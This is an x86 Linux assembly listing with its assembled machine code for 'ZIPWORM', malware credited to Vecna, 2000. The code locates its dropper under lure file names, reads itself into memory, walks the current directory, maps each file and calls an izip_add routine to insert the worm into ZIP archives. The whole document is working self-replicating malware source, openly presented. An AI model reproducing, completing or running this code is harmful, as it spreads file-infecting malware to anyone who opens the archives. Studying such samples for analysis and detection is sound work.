     1                                  ;ZIPWORM for Linux
     2                                  ;(c) Vecna 2000
     3                                  
     4                                  BITS 32
     5                                  
     6                                  ;%define DEBUG 1
     7                                  
     8                                  global main
     9                                  extern izip_add
    10                                  extern izip_maxaddsize
    11                                  
    12                                  [section .data]
    13 00000000 656C66207A69702077-                db "elf zip worm vecna", 0
    13 00000009 6F726D207665636E61-
    13 00000012 00                 
    14 00000013 [29000000]              nametable  dd name01
    15 00000017 [44000000]                         dd name02
    16 0000001B [66000000]                         dd name03
    17 0000001F [7F000000]                         dd name04
    18 00000023 [9D000000]                         dd name05
    19 00000027 2E00                    dot        db ".",0
    20 00000029 54656E206D6F746976-     name01     db "Ten motives why linux sux!",0
    20 00000032 657320776879206C69-
    20 0000003B 6E7578207375782100 
    21 00000044 5768792057696E646F-     name02     db "Why Windows is superior to Linux!",0
    21 0000004D 777320697320737570-
    21 00000056 6572696F7220746F20-
    21 0000005F 4C696E75782100     
    22 00000066 4973204C696E757820-     name03     db "Is Linux for you? Never!",0
    22 0000006F 666F7220796F753F20-
    22 00000078 4E657665722100     
    23 0000007F 4973204C696E757820-     name04     db "Is Linux immune to virus? NO!",0
    23 00000088 696D6D756E6520746F-
    23 00000091 2076697275733F204E-
    23 0000009A 4F2100             
    24 0000009D 7A6970776F726D2100      name05     db "zipworm!",0
    25                                  %ifdef DEBUG
    26                                  deb_msg0   times 80 db "-"
    27                                  deb_msg4   db 0dh,0ah,0
    28                                  deb_msg1   db "Running...",0dh,0ah,0
    29                                  deb_msg2   db "Exiting to OS",0dh,0ah,0
    30                                  deb_msg3   db "Opening: ",0
    31                                  deb_msg5   db "Found worm!",0dh,0ah,0
    32                                  deb_msg6   db "Worm size: ",0
    33                                  deb_msg7   db "File search done",0dh,0ah,0
    34                                  deb_msg8   db "File search init",0dh,0ah,0
    35                                  deb_msg9   db "Worm in mem!",0dh,0ah,0
    36                                  deb_msg10  db "Add size: ",0
    37                                  %endif
    38                                  
    39 000000A6 00000000                mapstruct  dd 0
    40 000000AA 00000000                mapsize	   dd 0
    41 000000AE 03000000                           dd 3
    42 000000B2 01000000                           dd 1
    43 000000B6 00000000                mapfilehnd dd 0
    44 000000BA 00000000                           dd 0
    45                                  
    46                                  [section .bss]
    47 00000000 <res 00000004>          hostptr    resd 1
    48 00000004 <res 00000004>          hostsize   resd 1
    49 00000008 <res 00000004>          addsize	   resd 1
    50 0000000C <res 00000004>          orgsize    resd 1
    51 00000010 <res 00000110>          dir_entry  resb 0110h
    52 00000120 <res 00004000>          hostbuffer resb 4000h
    53                                  
    54                                  [section .text]
    55                                  main:
    56                                  %ifdef DEBUG
    57                                         pushad
    58                                         mov ecx, deb_msg1
    59                                         call write_console
    60                                         popad
    61                                  %endif
    62 00000000 FC                             cld
    63 00000001 6A05                           push byte 5
    64 00000003 BE[13000000]                   mov esi, nametable
    65 00000008 59                             pop ecx
    66                                    .trynextname:
    67 00000009 51                             push ecx
    68 0000000A AD                             lodsd
    69 0000000B 89C3                           mov ebx, eax
    70                                  %ifdef DEBUG
    71                                         pushad
    72                                         mov ecx, deb_msg3
    73                                         call write_console
    74                                         mov ecx, ebx
    75                                         call write_console
    76                                         mov ecx, deb_msg4
    77                                         call write_console
    78                                         popad
    79                                  %endif
    80 0000000D 29C9                           sub ecx, ecx
    81 0000000F 6A05                           push byte 5h
    82 00000011 58                             pop eax
    83 00000012 99                             cdq
    84 00000013 CD80                           int 80h
    85 00000015 89C3                           mov ebx, eax
    86 00000017 85C0                           test eax, eax
    87 00000019 59                             pop ecx
    88 0000001A 7907                           jns .foundhost
    89 0000001C E2EB                           loop .trynextname
    90 0000001E E912010000                     jmp .exit
    91                                    .foundhost:
    92                                  %ifdef DEBUG
    93                                         pushad
    94                                         mov ecx, deb_msg5
    95                                         call write_console
    96                                         popad
    97                                  %endif
    98 00000023 81FE[27000000]                 cmp esi, dot
    99 00000029 7205                           jb .no_name_adj
   100 0000002B BE[13000000]                   mov esi, nametable
   101                                    .no_name_adj:
   102 00000030 6A13                           push byte 13h
   103 00000032 6A02                           push byte 2h
   104 00000034 29C9                           sub ecx, ecx
   105 00000036 5A                             pop edx
   106 00000037 58                             pop eax
   107 00000038 CD80                           int 80h
   108 0000003A A3[04000000]                   mov [hostsize], eax
   109                                  %ifdef DEBUG
   110                                         pushad
   111                                         mov ecx, deb_msg6
   112                                         call write_console
   113                                         mov eax, eax
   114                                         call write_dword
   115                                         popad
   116                                  %endif
   117 0000003F 6A13                           push byte 13h
   118 00000041 29C9                           sub ecx, ecx
   119 00000043 58                             pop eax
   120 00000044 99                             cdq
   121 00000045 CD80                           int 80h
   122 00000047 B9[20010000]                   mov ecx, hostbuffer
   123 0000004C 8B15[04000000]                 mov edx, [hostsize]
   124 00000052 6A03                           push byte 3
   125 00000054 58                             pop eax
   126 00000055 CD80                           int 80h                                  ;read dropper
   127 00000057 6A06                           push byte 6
   128 00000059 58                             pop eax
   129 0000005A CD80                           int 80h                                  ;close file
   130                                  %ifdef DEBUG
   131                                         pushad
   132                                         mov ecx, deb_msg9
   133                                         call write_console
   134                                         popad
   135                                  %endif
   136 0000005C FF36                           push dword [esi]
   137 0000005E FF35[04000000]                 push dword [hostsize]
   138 00000064 E8(00000000)                   call izip_maxaddsize       ;eax=size to increase .zip
   139 00000069 A3[08000000]                   mov [addsize], eax
   140                                  %ifdef DEBUG
   141                                         pushad
   142                                         mov ecx, deb_msg10
   143                                         call write_console
   144                                         mov eax, eax
   145                                         call write_dword
   146                                         popad
   147                                  %endif
   148 0000006E 6A05                           push byte 5
   149 00000070 BB[27000000]                   mov ebx, dot
   150 00000075 29C9                           sub ecx, ecx
   151 00000077 58                             pop eax
   152 00000078 99                             cdq
   153 00000079 CD80                           int 80h
   154 0000007B 89C3                           mov ebx, eax                             ;open current dir
   155                                  %ifdef DEBUG
   156                                         pushad
   157                                         mov ecx, deb_msg8
   158                                         call write_console
   159                                         popad
   160                                  %endif
   161                                    .next_entry:
   162 0000007D 6A59                           push byte 59h
   163 0000007F B9[10000000]                   mov ecx, dir_entry
   164 00000084 58                             pop eax
   165 00000085 CD80                           int 80h                                  ;read directory entry
   166 00000087 85C0                           test eax, eax
   167 00000089 0F84A6000000                   jz near .done
   168 0000008F 60                             pushad
   169 00000090 8D1D[1A000000]                 lea ebx, [dir_entry+0ah]
   170 00000096 0FB705[18000000]               movzx eax, word [dir_entry+8h]
   171 0000009D 99                             cdq
   172 0000009E 89540301                       mov dword [ebx+eax+1], edx                 ;put 0 marker
   173 000000A2 6A02                           push byte 2
   174 000000A4 6A05                           push byte 5h
   175 000000A6 58                             pop eax
   176 000000A7 59                             pop ecx
   177                                  %ifdef DEBUG
   178                                         pushad
   179                                         mov ecx, ebx
   180                                         call write_console
   181                                         mov ecx, deb_msg4
   182                                         call write_console
   183                                         popad
   184                                  %endif
   185 000000A8 CD80                           int 80h
   186 000000AA 85C0                           test eax, eax
   187 000000AC 0F887D000000                   js near .search_next
   188 000000B2 A3[B6000000]                   mov [mapfilehnd], eax
   189 000000B7 89C3                           mov ebx, eax
   190                                  
   191 000000B9 6A13                           push byte 13h
   192 000000BB 6A02                           push byte 2h
   193 000000BD 29C9                           sub ecx, ecx
   194 000000BF 5A                             pop edx
   195 000000C0 58                             pop eax
   196 000000C1 CD80                           int 80h
   197 000000C3 A3[0C000000]                   mov [orgsize], eax
   198 000000C8 89C7                           mov edi, eax
   199 000000CA 0305[08000000]                 add eax, [addsize]
   200 000000D0 A3[AA000000]                   mov [mapsize], eax
   201                                  
   202 000000D5 6A5D                           push byte 93
   203 000000D7 89C1                           mov ecx, eax
   204 000000D9 58                             pop eax
   205 000000DA CD80                           int 80h
   206                                  
   207 000000DC 6A5A                           push byte 90
   208 000000DE BB[A6000000]                   mov ebx, mapstruct
   209 000000E3 58                             pop eax
   210 000000E4 CD80                           int 80h
   211 000000E6 3D00F0FFFF                     cmp eax, 0fffff000h
   212 000000EB 7737                           ja .closehandle
   213 000000ED 89C3                           mov ebx, eax
   214                                  
   215 000000EF 57                             push edi
   216 000000F0 50                             push eax
   217 000000F1 FF36                           push dword [esi]
   218 000000F3 FF35[04000000]                 push dword [hostsize]
   219 000000F9 B8[20010000]                   mov eax, hostbuffer
   220 000000FE 50                             push eax
   221 000000FF E8(00000000)                   call izip_add
   222 00000104 85C0                           test eax, eax
   223 00000106 7406                           jz .clean
   224 00000108 0105[0C000000]                 add [orgsize], eax
   225                                    .clean:
   226 0000010E 6A5B                           push byte 91
   227 00000110 58                             pop eax
   228 00000111 CD80                           int 80h
   229                                  
   230 00000113 6A5D                           push byte 93
   231 00000115 8B0D[0C000000]                 mov ecx, [orgsize]
   232 0000011B 8B1D[B6000000]                 mov ebx, [mapfilehnd]
   233 00000121 58                             pop eax
   234 00000122 CD80                           int 80h
   235                                  
   236                                    .closehandle:
   237 00000124 6A06                           push byte 6
   238 00000126 8B1D[B6000000]                 mov ebx, [mapfilehnd]
   239 0000012C 58                             pop eax
   240 0000012D CD80                           int 80h                                  ;close file
   241                                  
   242                                    .search_next:
   243 0000012F 61                             popad
   244 00000130 E948FFFFFF                     jmp .next_entry
   245                                  
   246                                    .done:
   247                                  %ifdef DEBUG
   248                                         pushad
   249                                         mov ecx, deb_msg7
   250                                         call write_console
   251                                         popad
   252                                  %endif
   253                                  
   254                                    .exit:
   255                                  %ifdef DEBUG
   256                                         pushad
   257                                         mov ecx, deb_msg2
   258                                         call write_console
   259                                         popad
   260                                  %endif
   261 00000135 6A01                           push byte 1
   262 00000137 29DB                           sub ebx, ebx
   263 00000139 58                             pop eax
   264 0000013A CD80                           int 80h
   265                                  
   266                                  
   267                                  %ifdef DEBUG
   268                                  ;ecx=string
   269                                  write_console:
   270                                         pushad
   271                                         push byte -1
   272                                         mov edx, ecx
   273                                         mov esi, ecx
   274                                         pop ecx
   275                                    .count:
   276                                         inc ecx
   277                                         lodsb
   278                                         test al, al
   279                                         jnz .count
   280                                         xchg ecx, edx
   281                                         push byte 4
   282                                         push byte 1
   283                                         pop ebx
   284                                         pop eax
   285                                         int 80h
   286                                         popad
   287                                         ret
   288                                  %endif
   289                                  
   290                                  
   291                                  %ifdef DEBUG
   292                                  ;eax=dword
   293                                  write_dword:
   294                                         pushad
   295                                         sub esp, 32
   296                                         mov edi, esp
   297                                         push byte 8
   298                                         pop ecx
   299                                    .hexchar:
   300                                         rol eax, 4
   301                                         push eax
   302                                         and eax, 01111b
   303                                         call .table
   304                                         db "0123456789ABCDEF",0
   305                                    .table:
   306                                         pop ebx
   307                                         xlatb
   308                                         stosb
   309                                         pop eax
   310                                         loop .hexchar
   311                                         mov eax, 0d0ah
   312                                         stosd
   313                                         mov ecx, esp
   314                                         call write_console
   315                                         add esp, 32
   316                                         popad
   317                                         ret
   318                                  %endif
   319                                  
   320                                  
   321                                  %ifdef DEBUG
   322                                  output_registers:
   323                                         pushad
   324                                         mov ecx, deb_msg0
   325                                         call write_console
   326                                         call .0001
   327                                         db "EAX=", 0
   328                                    .0001:
   329                                         pop ecx
   330                                         call write_console
   331                                         mov eax, eax
   332                                         call write_dword
   333                                         call .0002
   334                                         db "EBX=", 0
   335                                    .0002:
   336                                         pop ecx
   337                                         call write_console
   338                                         mov eax, ebx
   339                                         call write_dword
   340                                         call .0003
   341                                         db "ECX=", 0
   342                                    .0003:
   343                                         pop ecx
   344                                         call write_console
   345                                         mov eax, ecx
   346                                         call write_dword
   347                                         call .0004
   348                                         db "EDX=", 0
   349                                    .0004:
   350                                         pop ecx
   351                                         call write_console
   352                                         mov eax, edx
   353                                         call write_dword
   354                                         call .0005
   355                                         db "ESP=", 0
   356                                    .0005:
   357                                         pop ecx
   358                                         call write_console
   359                                         mov eax, esp
   360                                         call write_dword
   361                                         call .0006
   362                                         db "EBP=", 0
   363                                    .0006:
   364                                         pop ecx
   365                                         call write_console
   366                                         mov eax, ebp
   367                                         call write_dword
   368                                         call .0007
   369                                         db "ESI=", 0
   370                                    .0007:
   371                                         pop ecx
   372                                         call write_console
   373                                         mov eax, esi
   374                                         call write_dword
   375                                         call .0008
   376                                         db "EDI=", 0
   377                                    .0008:
   378                                         pop ecx
   379                                         call write_console
   380                                         mov eax, edi
   381                                         call write_dword
   382                                         mov ecx, deb_msg0
   383                                         call write_console
   384                                         popad
   385                                         ret
   386                                  %endif
